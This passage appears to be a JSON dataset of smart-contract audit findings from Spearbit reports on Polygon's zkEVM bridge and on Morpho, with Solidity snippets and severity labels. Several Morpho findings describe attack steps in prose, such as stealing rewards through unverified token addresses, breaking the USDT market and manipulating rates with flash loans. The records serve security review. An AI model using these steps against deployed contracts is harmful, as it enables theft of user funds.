sequenceForceBatches(ForcedBatchData[] memory batches) ... { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Function denition of onMessageReceived()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "As discovered by the project: the function denition of onMessageReceived() is view and returns a boolean. Also, it is not payable. The function is meant to receive ETH so it should be payable. Also, it is meant to take action so is shouldnt be view. The bool return value isnt used in PolygonZkEVMBridge so isnt necessary. Because the function is called via a low-level call this doesnt pose a problem in practice. The current denition is confusing though. interface IBridgeMessageReceiver { function onMessageReceived(...) external view returns (bool); } contract PolygonZkEVMBridge is ... { function claimMessage( ... ) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "batchesNum can be explicitly casted in sequenceForceBatches()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The sequenceForceBatches() function performs a check to ensure that the sequencer does not sequence forced batches that do not exist. The require statement compares two different types; uint256 and uint64. For consistency, the uint256 can be safely cast down to uint64 as solidity 0.8.0 checks for over- ow/underow.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Metadata are not migrated on changes in l1 contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "wrapped tokens metadata will not change and would point to the older decimal If metadata changes on mainnet (say decimal change) after wrapped token creation then also 1. Token T1 was on mainnet with decimals 18. 2. This was bridged to rollup R1. 3. A wrapped token is created with decimal 18. 4. On mainnet T1 decimal is changed to 6. 5. Wrapped token on R1 still uses 18 decimals.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Remove unused import in PolygonZkEVMGlobalExitRootL2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The contract PolygonZkEVMGlobalExitRootL2 imports SafeERC20.sol, however, this isnt used in the contract. import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; contract PolygonZkEVMGlobalExitRootL2 { }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Switch from public to external for all non-internally called methods", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Functions that are not called from inside of the contract should be external instead of public, which prevents accidentally using a function internally that is meant to be used externally. See also issue \"Use calldata instead of memory for function parameters\".", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational DepositContract.sol#L90, DepositContract.sol#L124, PolygonZkEVMGlobalExitRootL2.sol#L40, PolygonZkEVM-"]}, {"title": "Common interface for PolygonZkEVMGlobalExitRoot and PolygonZkEVMGlobalExitRootL2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The contract PolygonZkEVMGlobalExitRoot inherits from IPolygonZkEVMGlobalExitRoot, while PolygonZkEVMGlobalExitRootL2 doesnt, although they both implement a similar interface. Note: PolygonZkEVMGlobalExitRoot implements an extra function getLastGlobalExitRoot(). the same interface le would improve the checks by the compiler. Inheriting from import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"; contract PolygonZkEVMGlobalExitRoot is IPolygonZkEVMGlobalExitRoot, ... { ... } contract PolygonZkEVMGlobalExitRootL2 { }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Abstract the way to calculate GlobalExitRoot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The algorithm to combine the mainnetExitRoot and rollupExitRoot is implemented in several locations in the code. This could be abstracted in contract PolygonZkEVMBridge, especially because this will be enhanced when more L2s are added. 30 contract PolygonZkEVMGlobalExitRoot is ... { function updateExitRoot(bytes32 newRoot) external { ... bytes32 newGlobalExitRoot = keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) , ); // first ... } function getLastGlobalExitRoot() public view returns (bytes32) { return keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); // second } } contract PolygonZkEVMBridge is ... { function _verifyLeaf(..., bytes32 mainnetExitRoot, bytes32 rollupExitRoot, ...) ... { ... uint256 timestampGlobalExitRoot = globalExitRootManager .globalExitRootMap( keccak256(abi.encodePacked(mainnetExitRoot, rollupExitRoot)) ); // third , ... } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "ETH honeypot on L2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The initial ETH allocation to the Bridge contract on L2 is rather large: 2E8 ETH on the test network and 1E11 ETH on the production network according to the documentation. This would make the bridge a large honey pot, even more than other bridges. If someone would be able to retrieve the ETH they could exchange it with all available other coins on the L2, bridge them back to mainnet, and thus steal about all TVL on the L2.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Allowance is not required to burn wrapped tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The burn of tokens of the deployed TokenWrapped doesnt use up any allowance, because the Bridge has the right to burn the wrapped token. Normally a user would approve a certain amount of tokens and then do an action (e.g. bridgeAsset()). This could be seen as an extra safety precaution. So you lose the extra safety this way and it might be unexpected from the users point of view. However, its also very convenient to do a one-step bridge (comparable to using the permit). Note: most other bridges do it also this way. function burn(address account, uint256 value) external onlyBridge { _burn(account, value); }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Messages are lost when delivered to EOA by claimMessage()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function claimMessage() calls the function onMessageReceived() via a low-level call. When the receiving address doesnt contain a contract the low-level call still succeeds and delivers the ETH. The documen- tation says: \"... IBridgeMessageReceiver interface and such interface must be fullled by the receiver contract, it will ensure that the receiver contract has implemented the logic to handle the message.\" As we understood from the project this behavior is intentional. It can be useful to deliver ETH to Externally owned accounts (EOAs), however, the message (which is the main goal of the function) isnt interpreted and thus lost, without any notication. The loss of the delivery of the message to EOAs (e.g. non contracts) might not be obvious to the casual readers of the code/documentation. function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Replace assembly of _getSelector() with Solidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function _getSelector() gets the rst four bytes of a series of bytes and used assembly. This can also be implemented in Solidity, which is easier to read. function _getSelector(bytes memory _data) private pure returns (bytes4 sig) { assembly { sig := mload(add(_data, 32)) } } function _permit(..., bytes calldata permitData) ... { bytes4 sig = _getSelector(permitData); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Improvement suggestions for Verifier.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Verifier.sol is a contract automatically generated by snarkjs and is based on the template ver- ier_groth16.sol.ejs. There are some details that can be improved on this contract. However, changing it will require doing PRs for the Snarkjs project.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Variable named incorrectly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Seems like the variable veryBatchTimeTarget was meant to be named verifyBatchTimeTarget as evidenced from the comment below: // Check if timestamp is above or below the VERIFY_BATCH_TIME_TARGET", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Add additional comments to function forceBatch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function forceBatch() contains a comment about synch attacks. what is meant by that. The team explained the following: Its not immediately clear  Getting the call data from an EOA is easy/cheap so no need to put the transactions in the event (which is expensive).  Getting the internal call data from internal transactions (which is done via a smart contract) is complicated (because it requires an archival node) and then its worth it to put the transactions in the event, which is easy to query. function forceBatch(...) ... { ... // In order to avoid synch attacks, if the msg.sender is not the origin // Add the transaction bytes in the event if (msg.sender == tx.origin) { emit ForceBatch(lastForceBatch, lastGlobalExitRoot, msg.sender, \"\"); } else { emit ForceBatch(lastForceBatch,lastGlobalExitRoot,msg.sender,transactions); } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Check against MAX_VERIFY_BATCHES", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "**In several functions a comparison is made with < MAX_VERIFY_BATCHES. This should probably be <= MAX_VERIFY_BATCHES, otherwise, the MAX will never be reached. uint64 public constant MAX_VERIFY_BATCHES = 1000; function sequenceForceBatches(ForcedBatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ... ); ... } function sequenceBatches(BatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ...); ... } function verifyBatches(...) ... { ... require(finalNewBatch - initNumBatch < MAX_VERIFY_BATCHES, ... ); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Prepare for multiple aggregators/sequencers to improve availability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "As long are there is one (trusted)sequencer and one (trusted)aggregator the availability risks are relatively high. However, the current code isnt optimized to support multiple trusted sequencers and multiple trusted aggregators. modifier onlyTrustedSequencer() { require(trustedSequencer == msg.sender, ... ); _; } modifier onlyTrustedAggregator() { require(trustedAggregator == msg.sender, ... ); _; }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Temporary Fund freeze on using Multiple Rollups", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Claiming of Assets will freeze temporarily if multiple rollups are involved as shown below. The asset will be lost if the transfer is done between: a. Mainnet -> R1 -> R2 b. R1 -> R2 -> Mainnet 1. USDC is bridged from Mainnet to Rollover R1 with its metadata. 2. User claims this and a new Wrapped token is prepared using USDC token and its metadata. bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); TokenWrapped newWrappedToken = (new TokenWrapped){salt: tokenInfoHash}(name, symbol, decimals); 3. Lets say the User bridge this token to Rollup R2. This will burn the wrapped token on R1 if (tokenInfo.originTokenAddress != address(0)) { // The token is a wrapped token from another network // Burn tokens TokenWrapped(token).burn(msg.sender, amount); originTokenAddress = tokenInfo.originTokenAddress; originNetwork = tokenInfo.originNetwork; } 4. The problem here is now while bridging the metadata was not set. 5. So once the user claims this on R2, wrapped token creation will fail since abi.decode on empty metadata will fail to retrieve name, symbol,... The asset will be temporarily lost since it was bridged properly but cannot be claimed Showing the transaction chain Mainnet bridgeAsset(usdc,R1,0xUser1, 100, )  Transfer 100 USDC to Mainnet M1  originTokenAddress=USDC  originNetwork = Mainnet  metadata = (USDC,USDC,6)  Deposit node created R1 claimAsset(...,Mainnet,USDC,R1,0xUser1,100, metadata = (USDC,USDC,6))  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  tokenInfoToWrappedToken[Mainnet,USDC] created using metadata = (USDC,USDC,6)  User minted 100 amount of tokenInfoToWrappedToken[Mainnet, USDC] bridgeAsset(tokenInfoToWrappedToken[Mainnet,USDC],R2,0xUser2, 100, )  Burn 100 tokenInfoToWrappedToken[Mainnet,USDC]  originTokenAddress=USDC  originNetwork = Mainnet 36  metadata = \"\"  Deposit node created with empty metadata R2 claimAsset(...,Mainnet,USDC,R2,0xUser2,100, metadata = \"\")  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  Since metadata = \"\" , abi decode fails", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Off by one error when comparing with MAX_TRANSACTIONS_BYTE_LENGTH constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "When comparing against MAX_TRANSACTIONS_BYTE_LENGTH, the valid range should be <= instead of <. require( transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::forceBatch: Transactions bytes overflow\" ); require( currentBatch.transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::sequenceBatches: Transactions bytes overflow\" );", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "trustedAggregatorTimeout value may impact batchFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "If trustedAggregatorTimeout and veryBatchTimeTarget are valued nearby then all batches veri- ed by 3rd party will be above target (totalBatchesAboveTarget) and this would impact batch fees. 1. Lets say veryBatchTimeTarget is 30 min and trustedAggregatorTimeout is 31 min. 2. Now anyone can call verifyBatches only after 31 min due to the below condition. 37 require( ); sequencedBatches[finalNewBatch].sequencedTimestamp + trustedAggregatorTimeout <= block.timestamp, \"PolygonZkEVM::verifyBatches: Trusted aggregator timeout not expired\" 3. This means _updateBatchFee can at minimum be called after 31 min of sequencing by a nontrusted aggre- gator. 4. The below condition then always returns true. if ( // 31>30 ) { block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Largest allowed batch fee multiplier is 1023 instead of 1024", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Per the setMultiplierBatchFee function, the largest allowed batch fee multiplier is 1023. /** * @notice Allow the admin to set a new multiplier batch fee * @param newMultiplierBatchFee multiplier bathc fee */ function setMultiplierBatchFee( uint16 newMultiplierBatchFee ) public onlyAdmin { require( newMultiplierBatchFee >= 1000 && newMultiplierBatchFee < 1024, \"PolygonZkEVM::setMultiplierBatchFee: newMultiplierBatchFee incorrect range\" ); multiplierBatchFee = newMultiplierBatchFee; emit SetMultiplierBatchFee(newMultiplierBatchFee); } However, the comment mentioned that the largest allowed is 1024. // Batch fee multiplier with 3 decimals that goes from 1000 - 1024 uint16 public multiplierBatchFee;", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Deposit token associated Risk Awareness", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The deposited tokens locked in L1 could be at risk due to external conditions like the one shown below: 1. Assume there is a huge amount of token X being bridged to roll over. 2. Now mainnet will have a huge balance of token X. 3. Unfortunately due to a hack or LUNA like condition, the project owner takes a snapshot of the current token X balance for each user address and later all these addresses will be airdropped with a new token based on screenshot value. 4. In this case, token X in mainnet will be screenshot but at disbursal time the newly updated token will be airdropped to mainnet and not the user. 5. Now there is no emergencywithdraw method to get these airdropped funds out. 6. For the users, if they claim funds they still get token X which is worthless.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Fees might get stuck when Aggregator is unable to verify", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The collected fees from Sequencer will be stuck in the contract if Aggregator is unable to verify the batch. In this case, Aggregator will not be paid and the batch transaction fee will get stuck in the contract", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Consider using OpenZeppelins ECDSA library over ecrecover", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "As stated here, ecrecover is vulnerable to a signature malleability attack. While the code in permit is not vulnerable since a nonce is used in the signed data, Id still recommend using OpenZeppelins ECDSA library, as it does the malleability safety check for you as well as the signer != address(0) check done on the next line.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Risk of transactions not yet in Consolidated state on L2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "There is are relatively long period for batches and thus transactions are to be between Trusted state and Consolidated state. Normally around 30 minutes but in exceptional situations up to 2 weeks. On the L2, users normally interact with the Trusted state. However, they should be aware of the risk for high-value transactions (especially for transactions that cant be undone, like transactions that have an effect outside of the L2, like off ramps, OTC transactions, alternative bridges, etc). There will be custom RPC endpoints that can be used to retrieve status information, see zkevm.go.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Delay of bridging from L2 to L1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The bridge uses the Consolidated state while bridging from L2 to L1 and the user interface It can take between 15 min and 1 hour.\". Other (opti- public.zkevm-test.net, shows \"Waiting for validity proof. mistic) bridges use liquidity providers who take the risk and allow users to retrieve funds in a shorter amount of time (for a fee).", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Missing Natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Some NatSpec comments are either missing or are incomplete.  Missing NatSpec comment for pendingStateNum: /** * @notice Verify batches internal function * @param initNumBatch Batch which the aggregator starts the verification * @param finalNewBatch Last batch aggregator intends to verify * @param newLocalExitRoot * @param newStateRoot New State root once the batch is processed * @param proofA zk-snark input * @param proofB zk-snark input * @param proofC zk-snark input */ function _verifyBatches( New local exit root once the batch is processed uint64 pendingStateNum, uint64 initNumBatch, uint64 finalNewBatch, bytes32 newLocalExitRoot, bytes32 newStateRoot, uint256[2] calldata proofA, uint256[2][2] calldata proofB, uint256[2] calldata proofC ) internal {  Missing NatSpec comment for pendingStateTimeout: /** * @notice Struct to call initialize, this basically saves gas becasue pack the parameters that can be packed , * and avoid stack too deep errors. * @param admin Admin address * @param chainID L2 chainID * @param trustedSequencer Trusted sequencer address * @param forceBatchAllowed Indicates wheather the force batch functionality is available * @param trustedAggregator Trusted aggregator * @param trustedAggregatorTimeout Trusted aggregator timeout */ struct InitializePackedParameters { address admin; uint64 chainID; address trustedSequencer; uint64 pendingStateTimeout; bool forceBatchAllowed; address trustedAggregator; uint64 trustedAggregatorTimeout; }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "_minDelay could be 0 without emergency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Normally min delay is only supposed to be 0 when in an emergency state. But this could be made to 0 even in nonemergency mode as shown below: 1. Proposer can propose an operation for changing _minDelay to 0 via updateDelay function. 2. Now, if this operation is executed by the executor then _minDelay will be 0 even without an emergency state. **", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Incorrect/incomplete comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "There are a few mistakes in the comments that can be corrected in the codebase.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Typos, grammatical and styling errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase. Some functions could also be renamed to better reect their purposes.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Enforce parameters limits in initialize() of PolygonZkEVM", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function initialize() of PolygonZkEVM doesnt enforce limits on trustedAggregatorTime- out and pendingStateTimeout, whereas the update functions setTrustedAggregatorTimeout() and setPend- ingStateTimeout(). As the project has indicated it might be useful to set larger values in initialize(). function initialize(..., InitializePackedParameters calldata initializePackedParameters,...) ... { trustedAggregatorTimeout = initializePackedParameters.trustedAggregatorTimeout; ... pendingStateTimeout = initializePackedParameters.pendingStateTimeout; ... } function setTrustedAggregatorTimeout(uint64 newTrustedAggregatorTimeout) public onlyAdmin { require(newTrustedAggregatorTimeout <= HALT_AGGREGATION_TIMEOUT,....); ... trustedAggregatorTimeout = newTrustedAggregatorTimeout; ... } function setPendingStateTimeout(uint64 newPendingStateTimeout) public onlyAdmin { require(newPendingStateTimeout <= HALT_AGGREGATION_TIMEOUT, ... ); ... pendingStateTimeout = newPendingStateTimeout; ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Informational"]}, {"title": "Findings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48 2 1 About Spearbit Spearbit is a decentralized network of expert security engineers offering reviews and other security related services to Web3 projects with the goal of creating a stronger ecosystem. Our network has experience on every part of the blockchain technology stack, including but not limited to protocol design, smart contracts and the Solidity compiler. Spearbit brings in untapped security talent by enabling expert freelance auditors seeking exibility to work on interesting projects together. Learn more about us at spearbit.com 2 Introduction Smart contract implementation which will be used by the Polygon-Hermez zkEVM. Disclaimer : This security review does not guarantee against a hack. It is a snapshot in time of zkEVM-Contracts according to the specic commit. Any modications to the code will require a new security review. 3 Risk classication Severity level Likelihood: high Likelihood: medium High Likelihood: low Medium Impact: High Impact: Medium Impact: Low Critical High Medium Low Medium Low Low 3.1 Impact  High - leads to a loss of a signicant portion (>10%) of assets in the protocol, or signicant harm to a majority of users.  Medium - global losses <10% or losses to only a subset of users, but still unacceptable.  Low - losses will be annoying but bearable--applies to things like grieng attacks that can be easily repaired or even gas inefciencies. 3.2 Likelihood  High - almost certain to happen, easy to perform, or not easy but highly incentivized  Medium - only conditionally possible or incentivized, but still relatively likely  Low - requires stars to align, or little-to-no incentive 3.3 Action required for severity levels  Critical - Must x as soon as possible (if already deployed)  High - Must x (before deployment if not already deployed)  Medium - Should x  Low - Could x 4 Executive Summary Over the course of 13 days in total, Polygon engaged with Spearbit to review the zkevm-contracts protocol. In this period of time a total of 68 issues were found. 3 Summary Project Name Polygon Repository Commit zkevm-contracts 5de59e...f899 Type of Project Cross Chain, Bridge Audit Timeline Jan 9 - Jan 25 Two week x period Jan 25 - Feb 8 Severity Critical Risk High Risk Medium Risk Low Risk Gas Optimizations Informational Total Issues Found Count Fixed Acknowledged 0 0 3 16 19 30 68 0 0 3 10 18 19 50 0 0 0 6 1 11 18 4 5 Findings 5.1 Medium Risk 5.1.1 Funds can be sent to a non existing destination", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Medium Risk"]}, {"title": "Wrong P2P exchange rate calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_p2pDelta is divided by _poolIndex and multiplied by _p2pRate, nevertheless it should have been multiplied by _poolIndex and divided by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_poolTokenAddress is referencing AToken so the totalStaked would be the total supply of the AToken. In this case, the totalStaked should reference the total supply of the DebtToken, otherwise the user would be rewarded for a wrong amount of reward.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "RewardsManagerAave does not verify token addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Aave has 3 different types of tokens: aToken, stable debt token and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them but Morpho never uses a stable-rate borrows token (sToken). The public accrueUserUnclaimedRewards function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows: 5 uint256 stakedByUser = reserve.variableDebtTokenAddress == asset ? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool : positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool; An attacker can accrue rewards by passing in an sToken address and steal from the contract, i.e:  Attacker supplies a large amount of tokens for which sToken rewards are defined.  The aToken reward index is updated to the latest index but the sToken index is not initialized.  Attacker calls accrueUserUnclaimedRewards([sToken]), which will compute the difference between the cur- rent Aave reward index and users sToken index, then multiply it by their supply balance.  The user accumulated rewards in userUnclaimedRewards[user] can be withdrawn by calling PositionMan- ager.claimRewards([sToken, ...]).  Attacker withdraws their supplied tokens again. The abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.", "labels": ["Spearbit", "Morpho", "Severity: Critical Risk"]}, {"title": "FullMath requires overflow behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "UniswapV3s FullMath.sol is copied and migrated from an old solidity version to version 0.8 which reverts on overflows but the old FullMath relies on the implicit overflow behavior. The current code will revert on overflows when it should not, breaking the SwapManagerUniV3 contract.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Morphos USDT mainnet market can end up in broken state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Note that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. In _repayERC20ToPool , it could be that _amount is approved but then _amount = Math.min(...) only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further _repayERC20ToPool/_- supplyERC20ToPool calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore. Example: Assume the attacker is first to borrow from the USDT market on Morpho.  Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).  Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.  Attacker attempts to repay 1000 USDT on Morpho. the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo- ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. It will approve 1000 USDT but  The USDT market is broken as it reverts on supply / repay calls when trying to approve the new amount", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Wrong reserve factor computation on P2P rates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates. supplyP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) / MAX_BASIS_POINTS; borrowP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) / MAX_BASIS_POINTS;", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager assumes Morpho token is token0 of every token pair", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The consult function wrongly assumes that the Morpho token is always the first token (token0) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "SwapManager fails at updating TWAP", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passed the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "P2P rate can be manipulated as its a lazy-updated snapshot", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of Its possible to manipulate these rates before triggering an update on the current Aave supply and borrow rate. Morpho. function _updateSPYs(address _marketAddress) internal { DataTypes.ReserveData memory reserveData = lendingPool.getReserveData( IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS() ); uint256 meanSPY = Math.average( reserveData.currentLiquidityRate, reserveData.currentVariableBorrowRate ) / SECONDS_PER_YEAR; // In ray } Example: Assume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:  Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).  The 